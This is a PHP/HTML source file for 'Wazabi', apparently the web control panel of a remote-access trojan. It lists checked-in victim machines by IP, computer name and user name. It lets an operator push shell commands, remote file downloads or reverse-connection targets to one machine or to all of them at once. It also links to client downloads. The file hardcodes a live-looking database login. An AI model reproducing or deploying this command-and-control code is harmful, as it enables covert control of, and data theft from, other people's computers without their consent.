<!DOCTYPE html>

<html>
    <head>
        <link rel="icon" type="image/png" href="favicon.png" />
        <meta charset="utf-8" />
        <style>
        
            .connect{
            font-family: 'marines',sans-serif;
            }
        
        h1{
        font-family: 'marines', sans-serif;
        font-size: 30px;
        
        }
        
        @font-face {
        font-family: 'marines';
        src: url('Tele-Marines.eot');
        src: local('marines'), local('marines'), url('Tele-Marines.woff') format('woff'), url('Tele-Marines.ttf') format('truetype'), url('Tele-Marines.svg') format('svg');
            }
            
            #consol {
                background-color: black;
                color: lawngreen;
                border: 5px solid darkred;
                border-radius: 20px;
                width: 1000px;
                height: 700px;
                position: fixed;
                margin-top: 50vh; 
                transform: translateY(-50%);
                margin-left: auto;
                margin-right: auto;
                left: 0;
                right: 0;
                                                            
            }
            #tap{
                bottom: 0;
                left: 0;
                right: 0;
                position: absolute;
            }
            #text{
                top: 60px;
                bottom: 50px;
                right: 0;
                left: 0;
                position: absolute;
                background-color : black;
            }

            
        .chat
        {
            top: 100px;
            right: 10px;
            min-height: 200px;
            width: 300px;
            height: 65%;
            position: absolute;
            opacity: 0.7;
        }
        .co
        {    
            top: 100px;
            left: 10px;
            max-height: 60%;
            max-width: 25%;
            opacity: 0.7;
            position: absolute;
            overflow: scroll;
        
        }
        
        .matrix
        {
            position: fixed;
            top: 0;
        }
        .monip
        {
            top: 0;
            border: 2px solid darkred;
            position: fixed;
            color: crimson;
            background-color: black;
            border-radius: 10px;
                
        }
        .yop
        {
            bottom: 40px;
            right: 5px;
            color: white;
            position: fixed;
        }
        .hat
        {
            left: 25%;
            top: 0;
            position: fixed;
            
        }
        mark
        {
            color: red;
            background-color: white;
            font-weight:bold;
        }
        .di
        {
            align-content: center;
            opacity: 0.7;
            border-radius: 30px;
            border-style: outset;
            border: 8px outset darkred;
            background-color: white;
            padding: 20px;
            margin-right: 20%;
            margin-left: 20%;
            min-width: 500px;
            margin-top: 100px;
            position: relative;
            
            
            
	        overflow: auto;
            margin-bottom: 55px;
        }
        .connected{
        border: 2px solid darkred;
        border-radius: 30px;
        padding: 10px;
        }
        body
        {
            cursor: url('curseurmetal.cur'), pointer; 
            margin: 0;
        }
            
        h1
        {
        }
            
        .lien
        {
            margin-right: 10%;
            margin-left: 15%;
            margin-top: 5px;
            height: 40px;
            cursor: url('curseurmetal2.cur'),pointer;
        }
        .lien:hover{
        image-resolution: 
                
        }
            
            
        .footer
        {
    
            background: url(backgroundheader.jpg) no-repeat;
            background-size: 100%;
            opacity: 0.7;
            bottom: 0;
            left: 0;
            right: 0;
            margin-top: 10px;
            position: fixed;
        }
        .logo
        {
            border-right : 1px solid black; 
            border-top: 1px solid black;
            bottom: 0;
            float: left;
        }
            
            .spanPerso
            {
                border: 0;
                cursor: url('curseurmetal2.cur'), pointer; 
            }
            .spanPerso:hover
            {
                border: 1px solid black;
            }
            #upload{
                border: 2px;
                position: absolute;
                top: 5px;
                right: 5px;
            }
            
        </style>
        <title>-|Wazabi|-</title>
    </head>
<body>
    
    <script>
        var cmd = 'NULL';
        var arg1 = "";
        var arg2 = "";
        var arg3 = "";
    </script>
    
    <script>
        var xhr = new XMLHttpRequest();
        var form = new FormData();
        
        var ipToi = <?php echo '"'. $_SERVER['REMOTE_ADDR'] . '"' ?>;
        var portToi = 0;
        var command = "";
        
        function Perso(id, ip, ipLocal, port, pc_name, user_name){
            this.id = id;
            this.ip = ip;
            this.ipLocal = ipLocal;
            this.port = port;
            this.pc_name = pc_name;
            this.user_name = user_name;
        }
              
        var persoArray = [];
        
        var persoClick = function(id){
            portToi = prompt("Port a Toi: ");
            xhr.open('POST', '');
            form.append('ipDist', persoArray[id - 1].ip);
            form.append('ipLocalDist', persoArray[id - 1].ipLocal);
            form.append('portDist', persoArray[id - 1].port);
            
            if(portToi != '0' && portToi != '-42'){
                form.append('ipControler', ipToi);
                form.append('portControler', portToi);
            
            }
            else{
                msg = prompt("Do you wanna have a bad time?"); //----------------------------------------------------------------COMMANDS-------------------------------------------------------------------------//
                
                //commands list
                if(msg == "shell" || msg == "system")
                {
                    cmd = "system";
                    arg1 = prompt("arg: ");
                }
                if(msg == 'send')
                    {
                        cmd = 'send';
                        arg1 = prompt('Site internet (ex: www.google.com   sans rien derriere)');
                        arg2 = prompt('Path (ex: apres google.com le truc | /machin.png)');
                        arg3 = prompt('la ou ca arrive sur le pc avec le nom du fichier + extension inclue');
                    }
                
                
                
                form.append('cmd', cmd);
                form.append('arg1', arg1);
                form.append('arg2', arg2);
                form.append('arg3', arg3);
                
                form.append('ipControler', "");
                form.append('portControler', "");
            }
            if(portToi == '-42'){
                form.append('ALLCONTROL', '42');
            }
            xhr.send(form);
            
            //alert("SEND!");
        };
    </script>
    
   <?php
            $persoArrayLenght = 0;
        ?>
        
        
         <canvas class="matrix" style="margin: 0; padding: 0; display: block;" id="canvas"></canvas>
		<!-- <div class="hat">
		<form id="Form" method="post" action="">
            <span><center><input type="text" name="ipDist" placeholder="ipDist"/>  <input type="text" name="ipLocalDist" placeholder="ipLocalDist"/>  <input type="text" name="portDist" placeholder="portDist"/>  <input type="text" name="ipControler" placeholder="ip a Toi"/>  <input type="text" name="portControler" placeholder="port a Toi"/> 
            
            <input type="submit" value="send"/></center></span>
        </form></div>-->
        
        
        
        <?php
            //echo 'result: ' . $_POST['test'];
			$bdd = new PDO('mysql:host=mysql.hostinger.fr;dbname=u950431307_sql0;charset=utf8', 'u950431307_yop', '123bonsoir');
			$ip = $_POST['ipDist'];
			$ipLocal = $_POST['ipLocalDist'];
			$port = $_POST['portDist'];
			$ipControler = $_POST['ipControler'];
			$portControler = $_POST['portControler'];
			$ctrl = 42;
            $cmd = $_POST['cmd'];
            $arg1 = $_POST['arg1'];
            $arg2 = $_POST['arg2'];
            $arg3 = $_POST['arg3'];
            $ALLCONTROL = $_POST['ALLCONTROL'];
            if($cmd != 'NULL')
                $ctrl = 0;
            if($ALLCONTROL != '42'){
			     $req2 = $bdd->prepare('UPDATE ls SET ipControl = :IPCONTROL, portControl = :PORTCONTROL, ctrl = :CTRL, cmd = :CMD, arg1 = :ARG1, arg2 = :ARG2, arg3 = :ARG3 WHERE ip = :IP AND ipLocal = :IPLOCAL AND port = :PORT');}
            else{
                 $req2 = $bdd->prepare('UPDATE ls SET ipControl = :IPCONTROL, portControl = :PORTCONTROL, ctrl = :CTRL, cmd = :CMD, arg1 = :ARG1, arg2 = :ARG2, arg3 = :ARG3 WHERE 1');}
			$req2->execute(array(
			'IP' => $ip,
			'IPLOCAL' => $ipLocal,
			'PORT' => $port,
			'IPCONTROL' => $ipControler,
			'PORTCONTROL' => $portControler,
			'CTRL' => $ctrl,
            'CMD' => $cmd,
            'ARG1' => $arg1,
            'ARG2' => $arg2,
            'ARG3' => $arg3
			));
			
			if(isset($_POST['ipDist']) || isset($_POST['ipLocalDist']) || isset($_POST['portDist']) || isset($_POST['ipControler']) || isset($_POST['portControler']))
			{
				header("Refresh:0");
			}
        ?>
        
        <div id="upload">
            <form id="fileForm" method="post" action="upload.php" enctype="multipart/form-data">
                <input type="file" id="fileInput" name="file" style="display:none" onchange="form.submit()"/>
                <img width="100px" src="upload.png" onclick="parcourir();"/>
            </form>
        </div>
        <center><div class="monip">
		<?php
			echo '&nbsp'. $_SERVER['REMOTE_ADDR'].'&nbsp';
		?> </div></center>
        
        <div class="di">
        
		<h1><center>- - - | wazabi is coming | - - - </center><br>       
        <center><img class="wazabi" width="60px" height="60px" src="wasabi.jpg" alt="wazabi"></center></h1>
        
        <?php
		$bdd = new PDO('mysql:host=mysql.hostinger.fr;dbname=u950431307_sql0;charset=utf8', 'u950431307_yop', '123bonsoir');
		$reponse = $bdd->query('SELECT * FROM ls WHERE date BETWEEN DATE_SUB(NOW() , INTERVAL 300 SECOND) AND NOW()');
		
		echo '<p class="connect"><strong> Connected: </strong> </p> <br />';
        ?>
        <div class="connected">
		<?php
		while($donnee = $reponse->fetch())
		{
            echo '<script>persoArray.push(new Perso(' . 'persoArray.lenght + 1' . ', "' . $donnee['ip'] . '", "' . $donnee['ipLocal'] . '", ' . $donnee['port'] . ', "' . $donnee['pc_name'] . '", "' . $donnee['user_name'] . '"));</script>';
            $persoArrayLenght++;
			echo "<span class=\"spanPerso\" onclick=\"persoClick($persoArrayLenght)\">" . 'ip: '. '<mark>' . $donnee['ip'].'</mark>' .' | ipLocal: ' .'<mark>'  . $donnee['ipLocal'] . '</mark>' . ' | port: ' .'<mark>'. $donnee['port'] .'</mark>'. ' | computer name: ' . $donnee['pc_name'] . ' | userName: ' . $donnee['user_name']/* . ' | heure: ' . $heure2 . ':' . $minute*/ . " | version: " . $donnee['version'] . " | CMD: " . $donnee['cmd'] . ' | id:' . $donnee['id'] . '</span>';
			echo '<br><br>';
		}
		
		$reponse->closeCursor();
        /*$file = fopen('connected.txt', 'a+');
		while(! feof($file))
		{
			echo fgets($file). "<br />";
		}
        fclose($file);*/
		?>
        </div>
        </div>
        <p class="yop">Created By DeePGameS</p>
        <footer class="footer">
            <a href="DeePGameS"><img class="logo" height="50px"  src="logo.png" alt="logo"></a>
        
        <a href="Download_A.R..php"><img class="lien" src="download_A.R..png" alt="download A.R." onmouseover="javascript:this.src='download_A.R.ne.png';" onmouseout="javascript:this.src='download_A.R..png';" /></a>
        <a href="Download_A.R.C..php"><img class="lien" src="download_A.R.C..png" alt="download A.R.C." onmouseover="javascript:this.src='download_A.R.C.ne.png';" onmouseout="javascript:this.src='download_A.R.C..png';" /></a>
        </footer>
       <audio src="piste.ogg" loop></audio>
        
        <!--<div class="chat"> <script id="cid0020000133566821772" data-cfasync="false" async src="//st.chatango.com/js/gz/emb.js" style="width: 100%;height: 100%;">{"handle":"jesuisuncanarddpgs","arch":"js","styles":{"a":"7a0000","b":100,"c":"FFFFFF","d":"FFFFFF","k":"7a0000","l":"7a0000","m":"7a0000","n":"FFFFFF","p":"10","q":"7a0000","r":100,"t":0,"ab":false,"usricon":0,"surl":0,"allowpm":0,"fwtickm":1}}</script> </div>-->
        
    </body>
    
	<script>
		var context = document.getElementById("canvas");
		var ctx = context.getContext("2d");
		
		context.height = window.innerHeight;
		context.width = window.innerWidth;
		//chinese characters - taken from the unicode charset
        var chinese = "0123456789ABCDEFあぁかさたなはまやゃらわがざだばぱいぃきしちにひみりゐぎじぢびぴうぅくすつぬふむゆゅるぐずづぶぷえぇけせてねへめれゑげぜでべぺおぉこそとのほもよょろをごぞどぼぽゔっんゝゞ、。";
        //converting the string into an array of single characters
        chinese = chinese.split("");

        var font_size = 10;
        var columns = context.width/font_size; //number of columns for the rain
        //an array of drops - one per column
        var drops = [];
        //x below is the x coordinate
        //1 = y co-ordinate of the drop(same for every drop initially)
        for(var x = 0; x < columns; x++)
            drops[x] = 1; 

        //drawing the characters
        var draw = function()
        {
            //Black BG for the canvas
            //translucent BG to show trail
            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
            ctx.fillRect(0, 0, context.width, context.height);
	
            ctx.fillStyle = "red"; 
            ctx.font = font_size + "px arial";
            //looping over drops
            for(var i = 0; i < drops.length; i++)
            {
                //a random chinese character to print
                var text = chinese[Math.floor(Math.random()*chinese.length)];
                //x = i*font_size, y = value of drops[i]*font_size
                ctx.fillText(text, i*font_size, drops[i]*font_size);
		
                //sending the drop back to the top randomly after it has crossed the screen
                //adding a randomness to the reset to make the drops scattered on the Y axis
                if(drops[i]*font_size > context.height && Math.random() > 0.975)
                    drops[i] = 0;
		
                //incrementing Y coordinate
                drops[i]++;
	       }
        };

        /*dataUrl = context.toDataURL();
        var body = document.getElementById("body");
        body.style.background='url('+dataUrl+')';*/
        
        setInterval(draw, 1000 / 30);
	</script>
    
    <script>
        var parcourir = function()
        {
            document.getElementById('fileInput').click();
            //if(confirm('Bon ba tu envoie du coup?')){
                //document.getElementById('fileForm').submit();}
            //else
              //  alert('bon ba tan pi');
        }
    </script>
</html>